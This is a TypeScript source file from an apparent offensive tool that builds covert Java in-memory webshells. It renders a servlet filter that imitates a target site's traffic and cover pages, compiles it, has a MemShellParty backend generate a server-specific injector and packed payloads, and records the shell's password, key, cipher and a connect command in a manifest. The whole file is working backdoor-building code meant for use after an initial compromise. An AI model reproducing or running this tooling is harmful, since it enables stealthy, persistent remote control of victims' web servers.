/**
 * `memparty custom build` — turn a site profile into an injectable mimic
 * memory shell:
 *
 *   profile ──render──> MimicFilter.java ──javac──> .class ──MemShellParty
 *   shellTool=Custom──> injector + packed payload, ready for the foothold
 *
 * The filter is a plain javax.servlet.Filter — it carries NO middleware
 * specifics. Those live in the injector, which MemShellParty generates for
 * the chosen --server (Tomcat, TongWeb, Jetty, …). Delivery (the RCE / file
 * upload / existing webshell that defines the class) stays with the operator.
 *
 * Everything the follow-up `connect` needs is written to a manifest.json in
 * the output directory — pass/key/cipher are baked into the class, so the
 * manifest is the single source of truth for the client side.
 */
import { mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { join } from "node:path";

import type { MemShellGenerateResponse, MemPartyClient } from "../api/index.js";
import { resolveCipher, type MimicCipher } from "../connect/mimic-codecs.js";
import { randomString } from "../connect/crypto.js";
import { resolveJreVersion } from "../core/jdk.js";
import {
  inferBodyTemplateContentType,
  profileRequests,
  profileTemplates,
  type SiteProfile,
} from "../core/site-profile.js";
import { renderFilterJava, renderWrapperJava } from "./java-template.js";
import { compileJava, servletApiJar } from "./javac.js";

export interface CustomBuildInput {
  profile: SiteProfile;
  /** MemShellParty server name, e.g. "Tomcat", "TongWeb" (see 'memparty config tools'). */
  server: string;
  /** Shell type the uploaded class implements (default "Filter"). */
  shellType?: string;
  /** Credentials baked into the filter — the client reuses them at connect time. */
  pass: string;
  secret: string;
  /** Injector URL pattern (default "/*"). */
  urlPattern?: string;
  /** Packer for the injector bytes (default "DefaultBase64"). */
  packer?: string;
  /** Target JRE, e.g. "java8" (default) — forwarded to the backend. */
  jdk?: string | number;
  /** Simple class name (default random MimicFilterXXXX — bump on every re-injection). */
  className?: string;
  /** Output directory for all artifacts. */
  outDir: string;
}

export interface CustomBuildResult {
  className: string;
  fullClassName: string;
  injectorClassName: string;
  packer: string;
  server: string;
  shellType: string;
  urlPattern: string;
  pass: string;
  secret: string;
  cipher: MimicCipher;
  /** Backend response (payloads included). */
  response: MemShellGenerateResponse;
  files: {
    java: string;
    classFile: string;
    manifest: string;
    payloads: Record<string, string>;
  };
}

/** The subset of MemPartyClient this flow needs (easy to fake in tests). */
export type GenerateClient = Pick<MemPartyClient, "generateMemShell">;

/** Injectable seams for tests. */
export interface BuildDeps {
  compile?: (sources: string[], outDir: string, opts: { classpath?: string[] }) => void;
  servletJar?: () => string;
}

/** Carrier field names the filter should probe, from the profile's request shapes. */
export function profileSecretFields(profile: SiteProfile): string[] {
  const shapes = profileRequests(profile);
  const fields = [...new Set(shapes.map((r) => r.secretField).filter(Boolean))];
  return fields.length > 0 ? fields : ["pass"];
}

/** Normalize a Content-Type to the lowercase needle the filter contains-matches. */
function ctNeedle(ct: string): string {
  const media = ct.toLowerCase().split(";", 1)[0]!.trim();
  if (media.includes("json")) return "json";
  if (media.includes("multipart")) return "multipart";
  if (media.includes("xml")) return "xml";
  return media;
}

/**
 * Body Content-Type needles the filter reads bodies for, derived from the
 * profile's body shapes (json bodyStyle / bodyTemplate CT, explicit or
 * inferred). Empty = the filter never touches the body stream — reading a
 * body the shell doesn't own consumes it and breaks the app behind it.
 */
export function profileBodyContentTypes(profile: SiteProfile): string[] {
  const needles = new Set<string>();
  for (const r of profileRequests(profile)) {
    if (r.secretIn !== undefined && r.secretIn !== "body") continue;
    if (r.bodyTemplate !== undefined) {
      const explicit = Object.entries(r.headers ?? {}).find(
        ([k]) => k.toLowerCase() === "content-type",
      )?.[1];
      const ct = explicit ?? inferBodyTemplateContentType(r.bodyTemplate);
      if (ct) needles.add(ctNeedle(ct));
    } else if (r.bodyStyle === "json") {
      needles.add("json");
    }
  }
  return [...needles];
}

/** Default class name: MimicFilter + 4 random chars (a JVM can't re-define a class). */
export function defaultClassName(): string {
  return `MimicFilter${randomString(4)}`;
}

export async function buildCustomMemshell(
  input: CustomBuildInput,
  client: GenerateClient,
  deps: BuildDeps = {},
): Promise<CustomBuildResult> {
  const compile = deps.compile ?? compileJava;
  const jarOf = deps.servletJar ?? servletApiJar;

  const className = input.className ?? defaultClassName();
  const shellType = input.shellType ?? "Filter";
  const urlPattern = input.urlPattern ?? "/*";
  const packer = input.packer ?? "DefaultBase64";
  const cipher = resolveCipher(input.profile.cipher);
  const templates = profileTemplates(input.profile).map((t) => ({
    template: t.template,
    contentType: t.contentType,
  }));
  if (templates.length === 0) {
    throw new Error(`profile '${input.profile.name}' has no templates — nothing to use as cover page`);
  }

  const outDir = input.outDir;
  const packageDir = join(outDir, "mimic");
  mkdirSync(packageDir, { recursive: true });

  // phase 1: the body-caching wrapper (fixed source). Its bytes ride inside
  // the filter as base64 — the filter self-defines them at runtime, because
  // MemShellParty's Custom generator can only resolve a single class file.
  const wrapperFile = join(packageDir, "CachedBody.java");
  writeFileSync(wrapperFile, renderWrapperJava(), "utf8");
  compile([wrapperFile], outDir, { classpath: [jarOf()] });
  const wrapper = {
    bodyB64: readFileSync(join(packageDir, "CachedBody.class")).toString("base64"),
    streamB64: readFileSync(join(packageDir, "CachedBody$Stream.class")).toString("base64"),
  };

  // phase 2: the filter itself (single self-contained class uploaded to the backend)
  const javaSource = renderFilterJava({
    className,
    pass: input.pass,
    secret: input.secret,
    fields: profileSecretFields(input.profile),
    bodyContentTypes: profileBodyContentTypes(input.profile),
    templates,
    cipher,
    wrapper,
  });
  const javaFile = join(packageDir, `${className}.java`);
  writeFileSync(javaFile, javaSource, "utf8");

  compile([javaFile], outDir, { classpath: [jarOf()] });
  const classFile = join(packageDir, `${className}.class`);
  const shellClassBase64 = readFileSync(classFile).toString("base64");

  const response = await client.generateMemShell({
    shellConfig: {
      server: input.server,
      shellTool: "Custom",
      shellType,
      targetJreVersion: resolveJreVersion(input.jdk ?? "java8"),
    },
    shellToolConfig: {
      shellClassName: `mimic.${className}`,
      shellClassBase64,
    },
    injectorConfig: { urlPattern },
    packer,
  });

  // one file per payload variant (aggregate packers return several)
  const payloads: Record<string, string> = {};
  if (response.allPackResults && Object.keys(response.allPackResults).length > 0) {
    for (const [name, value] of Object.entries(response.allPackResults)) {
      const file = join(outDir, `payload-${name}.txt`);
      writeFileSync(file, `${value}\n`, "utf8");
      payloads[name] = file;
    }
  } else if (response.packResult !== undefined) {
    const file = join(outDir, "payload.txt");
    writeFileSync(file, `${response.packResult}\n`, "utf8");
    payloads[packer] = file;
  }

  const result: CustomBuildResult = {
    className,
    fullClassName: `mimic.${className}`,
    injectorClassName: response.memShellResult.injectorClassName,
    packer,
    server: input.server,
    shellType,
    urlPattern,
    pass: input.pass,
    secret: input.secret,
    cipher,
    response,
    files: {
      java: javaFile,
      classFile,
      manifest: join(outDir, "manifest.json"),
      payloads,
    },
  };

  const manifest = {
    tool: "mimic",
    createdAt: new Date().toISOString(),
    profile: input.profile.name,
    server: result.server,
    shellType: result.shellType,
    urlPattern: result.urlPattern,
    packer: result.packer,
    className: result.fullClassName,
    injectorClassName: result.injectorClassName,
    pass: result.pass,
    key: result.secret,
    cipher: result.cipher,
    note:
      "pass/key/cipher are baked into the filter class. Editing the profile's cipher " +
      "section afterwards desynchronizes client and server — rebuild and re-inject.",
    connect: `memparty connect -u <shell-url> -t mimic --profile ${input.profile.name} --pass ${result.pass} --key ${result.secret}`,
    files: result.files,
  };
  writeFileSync(result.files.manifest, `${JSON.stringify(manifest, null, 2)}\n`, "utf8");

  return result;
}
